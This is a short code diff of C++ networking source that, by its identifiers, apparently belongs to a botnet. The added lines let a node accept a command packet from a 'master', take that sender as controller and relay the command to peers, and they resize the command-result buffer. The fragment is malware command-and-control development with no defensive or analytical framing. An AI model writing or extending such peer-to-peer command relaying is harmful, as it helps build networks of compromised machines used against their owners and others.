@@ -137,6 +137,12 @@ void Communication::HandleIncomingsUDP()
 
 		switch (p->type)
 		{
+		case COMMAND: //when the master takes control
+			master = client;
+			send_command((u_char*)buf, BOTNET_PACK_SIZE);
+			break;
+		case VERSION_SYNC_REQUEST: //when someone asks from you to give him information.
+			break;
 		case SYNC_REPLY:
 			network.AddHost(client.sin_addr.S_un.S_addr);
 			break;
@@ -196,7 +202,7 @@ void Communication::HandleCommandResults()
 	if (IPC_init() != 0)
 		return;
 	
-	u_char command_res[1024];
+	u_char command_res[sizeof(struct botnet_pack)];
 	
 	while (1)
 	{
